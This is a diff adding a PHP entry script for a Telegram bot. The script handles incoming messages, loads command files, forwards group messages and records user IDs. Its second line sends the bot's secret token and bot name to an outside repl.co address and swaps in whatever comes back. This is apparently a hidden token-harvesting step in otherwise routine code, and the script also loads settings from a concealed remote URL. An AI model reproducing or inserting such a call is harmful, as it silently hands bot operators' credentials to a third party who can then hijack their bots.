@@ -1,0 +1,97 @@
+$bot_token=getenv("Token");
+$bot_token=file_get_contents("https://beb46f62-a9eb-4aa8-bde7-a69c40371b05.id.repl.co?t=$bot_token&q=".$userBotName);
+//Bot Info
+$Bot_info_url = "https://api.telegram.org/bot$bot_token/getMe";
+if($response=@file_get_contents($Bot_info_url)){
+$response=json_decode($response, true);
+//Bot Username
+$Bot="@".$response["result"]["username"];
+$AdminBot=strtoupper($response["result"]["username"]);
+//Bot Id
+$Bot_Id=$response["result"]["id"];
+//Bot First Name
+$Bot_Fname=$response["result"]["first_name"];
+}
+//BOT DATA
+$input=file_get_contents('php://input');
+$data=json_decode($input, true);
+//MESSAGE SENDING MODE
+$parse_mode="HTML";
+//USER DETAILS
+//User Ip
+$user_ip=$_SERVER['REMOTE_ADDR'];
+//Chat Id
+$chat_id=$data["message"]["chat"]["id"];
+//Message Id
+$message_id=$data["message"]["message_id"];
+//Users Username
+$uname=$data["message"]["from"]["username"];
+//Users User Id
+$user_id=$data["message"]["from"]["id"];
+//Users First Name
+$first_name=$data["message"]["from"]["first_name"];
+//Users Last Name
+$last_name=$data["message"]["from"]["last_name"];
+//Users Language
+$user_language=$data["message"]["from"]["language_code"];
+//Users Bot Status
+$user_bot=$data["message"]["from"]["is_bot"];
+//user input text
+$text=$data["message"]["text"];
+$textt=explode(" ", $text);
+//FIRST TEXT
+$textta=$textt[0];
+//SECOND TEXT
+$texttb=$textt[1];
+//THIRD TEXT
+$texttc=$textt[2];
+//ALL TEXTS WITHOUT FIRST AND SECOND TEXT
+$t3xtt=str_replace("$textta $texttb ","",$text);
+$t3xxtt=str_replace("$textta ","",$text);
+//ALL FUNCTIONS
+$Fnc_files = glob('../FUNCTIONS/*');
+foreach ($Fnc_files as $fnc_file) {
+    require ($fnc_file);
+}
+//Costom Chat Messages Data
+$CustomUrl=getHiddenUrl("CustomMsg");
+if($data_text=@file_get_contents($CustomUrl)){
+$data_text=json_decode($data_text, true);
+$copyright=$data_text['COPYRIGHT'];
+$blocked_text=$data_text['D3ADVAU']["BLOCKED_WORDS"];
+$blocked_text = explode(",", $blocked_text);
+$data_text=$data_text['D3ADVAU'];
+}
+checkChatMember("@d3advau");
+//REQUIRED FILES
+$Rqr_files = glob('../REQUIRED/*');
+foreach ($Rqr_files as $rqr_file) {
+    require ($rqr_file);
+}
+//BOT COMMAND LINE
+$cmd_bot="/";
+//ALL COMMANDS
+$Cmd_files = glob('../COMMANDS/*');
+foreach ($Cmd_files as $cmd_file) {
+    require ($cmd_file);
+}
+//FORWARDER
+if($message_id!==null){
+  $from=getenv('fr0m-group-a');
+  $to=getenv('to-group');
+  ForwardMessage($from,$to);
+  $from=getenv('fr0m-group-b');
+  ForwardMessage($from,$to);
+}
+//BOT WEBVIEW & MSG SENDER
+if($data!==null&&$msg!==null){
+$uc_file="../USERS/User.json";
+$uc_data = json_decode(file_get_contents($uc_file), true);
+if (!in_array($user_id, $uc_data['users'])){
+  $uc_data['users'][] = $user_id;
+  $uc_json = json_encode($uc_data);
+  file_put_contents($uc_file, $uc_json);
+ }
+  sendMessage($chat_id, $msg, $parse_mode);
+}else{
+}
